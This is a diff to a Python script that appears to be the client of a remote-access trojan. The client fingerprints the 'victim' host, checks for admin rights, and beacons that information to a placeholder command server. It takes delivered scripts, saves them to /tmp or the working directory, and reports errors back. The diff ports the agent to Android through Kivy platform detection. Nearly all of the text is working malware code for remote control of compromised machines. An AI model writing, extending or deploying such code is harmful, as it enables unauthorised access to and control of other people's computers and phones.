@@ -13,21 +13,22 @@ import ctypes
 import psutil
 import socket
 import hashlib
+from kivy.utils import platform as PLATFORM_NAME
 
 server_url = "##SERVER_URL##"
 
 def staging(identifier):
 	url = f"http://{server_url}/stage_0"
-	platform_name = platform.system()
 
 	## Check if ran as admin or not
-	if platform_name == 'Windows':
+	if PLATFORM_NAME == 'Windows':
 		admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
-	elif platform_name == 'Linux':
+	elif PLATFORM_NAME in ['Linux','Android']:
 		admin = os.getuid() == 0
 
+
 	cookies = {'session': base64.b64encode(identifier.encode("ascii")).decode("ascii")}
-	os_info = {'platform': platform_name, 'version': platform.release(), 'admin':admin,'location' : os.path.dirname(os.path.realpath(__file__))}
+	os_info = {'platform': PLATFORM_NAME, 'version': platform.release(), 'admin':admin,'location' : os.path.dirname(os.path.realpath(__file__))}
 	r = requests.post(url = url,cookies = cookies, data = os_info)
 	return r
 
@@ -59,7 +60,7 @@ def handle_commands(response, identifier):
 		language = res['language']
 
 		## Save the script to file
-		if platform.system() == 'Linux':
+		if PLATFORM_NAME == 'Linux':
 			dump_dir = '/tmp'
 		else:
 			dump_dir = os.getcwd()
@@ -117,13 +118,20 @@ def handle_commands(response, identifier):
 		requests.post(url = url,cookies = cookies, data = traceback.format_exc())
 
 def main():
-
+	global PLATFORM_NAME
 	## Will identify the victim
-	platform_name = platform.system()
-	if platform_name == 'Windows':
-		hash = hashlib.sha256((f"{os.getlogin()}@{socket.gethostname()}@{platform.system()}@{platform.release()}@{ctypes.windll.shell32.IsUserAnAdmin()}").encode())
-	elif platform_name == 'Linux':
-		hash = hashlib.sha256((f"{os.getlogin()}@{socket.gethostname()}@{platform.system()}@{platform.release()}@{os.getuid()}").encode())
+	if PLATFORM_NAME == 'win':
+		PLATFORM_NAME = 'Windows'
+		hash = hashlib.sha256((f"{os.getlogin()}@{socket.gethostname()}@{PLATFORM_NAME}@{platform.release()}@{ctypes.windll.shell32.IsUserAnAdmin()}").encode())
+	elif PLATFORM_NAME == 'linux':
+		PLATFORM_NAME = 'Linux'
+		hash = hashlib.sha256((f"{os.getlogin()}@{socket.gethostname()}@{PLATFORM_NAME}@{platform.release()}@{os.getuid()}").encode())
+	elif PLATFORM_NAME == 'android':
+		PLATFORM_NAME = 'Android'
+		hash = hashlib.sha256((f"{os.getlogin()}@{socket.gethostname()}@{PLATFORM_NAME}@{platform.release()}@{os.getuid()}").encode())
+
+
+
 	identifier = hash.hexdigest()[0:10]
 	response = staging(identifier)
 	
